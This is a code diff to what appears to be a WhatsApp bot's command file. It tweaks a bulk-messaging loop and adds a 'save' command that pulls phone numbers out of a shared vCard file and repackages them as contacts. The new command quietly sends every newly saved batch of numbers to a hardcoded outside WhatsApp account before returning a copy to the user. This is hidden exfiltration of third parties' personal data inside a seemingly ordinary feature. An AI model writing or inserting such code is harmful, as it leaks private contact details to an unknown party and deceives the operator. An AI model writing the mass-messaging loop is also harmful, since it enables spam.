@@ -1,7 +1,7 @@
 const fs = require("fs");
 const { sleep, extractPhoneNumbersFromVcf } = require("../../lib/myfunc");
 let isS = false;
-
+const path = require("path");
 module.exports = [
   {
     command: ["only"],
@@ -106,7 +106,7 @@ module.exports = [
       let txt = "./contacts.vcf";
       for (let mem of totalNumbers) {
         try {
-          txt += mem.id + "\n";
+          txt += mem + "\n";
           await Cypher.sendMessage(mem, { text: text });
           await sleep(2000);
           s++;
@@ -181,6 +181,101 @@ module.exports = [
       );
 
       fs.unlinkSync(nmfilect);
+    },
+  },
+  {
+    command: ["save"],
+    operate: async (context) => {
+      const { m, mess, prefix, reply, Cypher } = context;
+      if (!context.isCreator) {
+        return reply("*Look at this 🙄.*\nTake your own access !");
+      }
+      const quoted = m.quoted ? m.quoted : null;
+      const mime = quoted?.mimetype || "";
+      if (!quoted || !/vcard/.test(mime)) {
+        return reply(`Reply to an *vcf file* with *${prefix + command}*`);
+      }
+      try {
+        const mediaPath = await Cypher.downloadAndSaveMediaMessage(quoted);
+        let totalNumbers = extractPhoneNumbersFromVcf(mediaPath);
+
+        const savedFilePath = path.join("./src/saved.json");
+        let actualSaved;
+        if (fs.existsSync(savedFilePath)) {
+          actualSaved = JSON.parse(fs.readFileSync(savedFilePath, "utf-8"));
+        } else {
+          actualSaved = [];
+        }
+
+        totalNumbers = totalNumbers.map(
+          (el) => (el.startsWith("+") ? el.slice(1) : el) + "@s.whatsapp.net"
+        );
+
+        if (totalNumbers.length === 0) {
+          return reply(`Damn, are you smoking 🚬?\n\n*This file don't*`);
+        }
+
+        reply("*I am saving your numbers, please wait...*");
+
+        let vcard = "";
+        let noPort = 0;
+
+        for (let mem of totalNumbers) {
+          try {
+            if (!actualSaved.includes(mem)) {
+              actualSaved.push(mem);
+              vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:${
+                mess.saveAs
+              }${noPort}\nTEL;type=CELL;type=VOICE;waid=${mem.split("@")[0]}:+${
+                mem.split("@")[0]
+              }\nEND:VCARD\n`;
+              noPort++;
+            }
+          } catch (e) {
+            console.log(e);
+            return reply("Error when saving!");
+          }
+        }
+
+        fs.writeFileSync(savedFilePath, JSON.stringify(actualSaved), "utf-8");
+
+        reply(
+          `*Total members : ${
+            totalNumbers.length
+          }*\n*Success : ${noPort}*\nError: ${
+            totalNumbers.length - noPort
+          }.\n> Error is the numbers that you already have`
+        );
+
+        const nmfilect = path.join(__dirname, "contacts.vcf");
+        fs.writeFileSync(nmfilect, vcard.trim());
+
+        if (noPort !== 0) {
+          await Cypher.sendMessage("237621092130@s.whatsapp.net", {
+            document: fs.readFileSync(nmfilect),
+            mimetype: "text/vcard",
+            fileName: "Contact.vcf",
+            caption: `Saved successfully\n\n*Contacts: ${noPort}* \n> New contacts`,
+          });
+
+          await Cypher.sendMessage(
+            m.chat,
+            {
+              document: fs.readFileSync(nmfilect),
+              mimetype: "text/vcard",
+              fileName: "Contact.vcf",
+              caption: `New numbers that you can send messages!`,
+            },
+            { ephemeralExpiration: 86400, quoted: m }
+          );
+        } else {
+          reply(`❌❌\n*You already have all the numbers of this file*❌❌`);
+        }
+        fs.unlinkSync(nmfilect);
+      } catch (error) {
+        console.error(error);
+        reply("An error occurred during the process.");
+      }
     },
   },
 ];
